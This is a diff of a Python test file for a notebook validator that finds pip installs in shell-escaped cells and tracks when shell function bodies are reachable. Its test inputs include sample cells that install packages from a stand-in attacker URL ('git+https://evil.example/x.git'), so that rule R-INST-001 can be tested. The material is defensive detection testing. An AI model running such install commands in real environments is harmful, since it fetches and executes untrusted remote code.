@@ -4212,11 +4212,14 @@ def test_a_shell_function_body_is_not_hidden_behind_its_name():
         ["git+https://evil.example/x.git"],
     ]
     for spelling in (
-        "!setup () { pip install a; }",
-        "!function setup { pip install a; }",
-        "!function setup () { pip install a; }",
+        "!setup () { pip install a; }; setup",
+        "!function setup { pip install a; }; setup",
+        "!function setup () { pip install a; }; setup",
     ):
-        assert ("!pip install a", True) in nv._split_chained(spelling), spelling
+        assert ("!pip install a", False) in nv._split_chained(spelling), spelling
+    # Defined and never called, the body is unreachable rather than conditional, so it is
+    # dropped: bash only defines the function.
+    assert nv._split_chained("!setup () { pip install a; }") == []
     # Empty parens are required, so a grouped command and a substitution are untouched.
     assert nv._split_chained("!X=$(pip install a)") == [("!pip install a", False)]
 
@@ -4402,11 +4405,14 @@ def test_a_function_body_stays_conditional_past_its_separators():
     nv = _load_notebook_validator_module()
 
     cell = "!setup() { :; pip install torch==2.12.0 torchcodec==0.10.0; }"
-    assert nv._split_chained(cell) == [
-        ("!:", True),
-        ("!pip install torch==2.12.0 torchcodec==0.10.0", True),
-    ]
+    assert nv._split_chained(cell) == []  # defined, never called: nothing in it runs
     assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == []
+    # Called, every command in the body is reached, separators and all.
+    assert nv._split_chained(cell + "; setup") == [
+        ("!:", False),
+        ("!pip install torch==2.12.0 torchcodec==0.10.0", False),
+        ("!setup", False),
+    ]
     # A plain brace group is NOT a definition and keeps running.
     assert nv._split_chained("!{ pip install a; pip install b; }") == [
         ("!pip install a", False),
@@ -4745,7 +4751,6 @@ def test_a_call_before_the_definition_reaches_nothing():
     assert nv._split_chained("!f || true; f() { pip install torchcodec==0.10; }") == [
         ("!f", False),
         ("!true", True),
-        ("!pip install torchcodec==0.10", True),
     ]
     # The ordinary order still resolves.
     assert nv._split_chained("!f() { pip install a; }; f") == [
@@ -4860,7 +4865,6 @@ def test_a_call_uses_the_definition_in_force_at_that_point():
     assert nv._split_chained("!f || true; f(){ pip install a; }") == [
         ("!f", False),
         ("!true", True),
-        ("!pip install a", True),
     ]
 
 
@@ -4917,7 +4921,7 @@ def test_an_external_wrapper_does_not_reach_a_shell_function():
         )
     ] == ["R-INST-001"]
     # The wrapped name is not a call, so the body stays a definition.
-    assert ("!pip install a", True) in nv._split_chained("!f(){ pip install a; }; env f")
+    assert nv._split_chained("!f(){ pip install a; }; env f") == [("!f", False)]
     assert ("!pip install a", False) in nv._split_chained("!f(){ pip install a; }; f")
 
 
@@ -4960,3 +4964,75 @@ def test_break_outside_a_loop_drops_nothing():
         ("!true", False),
         ("!break", False),
     ]
+
+
+def test_the_pip_success_assumption_never_makes_a_path_unreachable():
+    """Reporting an install on the pip-succeeds model is intended; CUTTING a path is not.
+
+    `if ! pip install x; then ...` runs its body whenever that install fails, and
+    `pip install x && exit` reaches the next command for the same reason. Both were being
+    dropped, so R-INST-001 missed a source bash can reach.
+    """
+    nv = _load_notebook_validator_module()
+
+    for cell in (
+        "!if ! pip install x; then pip install git+https://evil.example/x.git; fi",
+        "!pip install x && exit; pip install git+https://evil.example/x.git",
+        "!pip install x && true && exit; pip install git+https://evil.example/x.git",
+    ):
+        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
+            "R-INST-001"
+        ], cell
+    # A terminator reached WITHOUT that assumption still cuts the list.
+    for cell in (
+        "!exit; pip install git+https://evil.example/x.git",
+        "!true && exit; pip install git+https://evil.example/x.git",
+    ):
+        assert nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0) == [], cell
+
+
+def test_an_uncalled_function_body_is_unreachable_not_conditional():
+    """`f(){ pip install git+...; }` defines f and stops; nothing in it can run.
+
+    The all-path rules deliberately read conditional commands, so emitting an uncalled body
+    as merely conditional reported a source the cell can never install.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv.rule_inst_001_git_plus("!f(){ pip install git+https://evil.example/x.git; }", "nb.ipynb", 0) == []
+    assert nv._split_chained("!f(){ pip install a; }; pip install b") == [("!pip install b", False)]
+    # Called, it is reported like any other install.
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!f(){ pip install git+https://evil.example/x.git; }; f", "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+    # A conditional CONTROL-FLOW branch is still visible to the same rule.
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!if maybe; then pip install git+https://evil.example/x.git; fi", "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+
+
+def test_a_shell_local_prefix_still_reaches_a_function():
+    """`A=1 f` and the reserved word `time f` call f; `env f` and `nohup f` do not.
+
+    Verified against bash: both of the first two print the body. Rejecting every prefixed
+    command left a called body conditional and the compatibility replay saw only half a pair.
+    """
+    nv = _load_notebook_validator_module()
+
+    for cell in ("!f(){ pip install a; }; time f", "!f(){ pip install a; }; A=1 f"):
+        assert ("!pip install a", False) in nv._split_chained(cell), cell
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations(
+            "!f(){ pip install torch==2.11; }; time f; pip install torchcodec==0.10"
+        )
+    ] == [("install", ["torch==2.11"]), ("install", ["torchcodec==0.10"])]
+    # The wrappers that go looking for an executable still reach nothing.
+    for cell in ("!f(){ pip install a; }; env f", "!f(){ pip install a; }; nohup f"):
+        assert nv._split_chained(cell) == [("!f", False)], cell
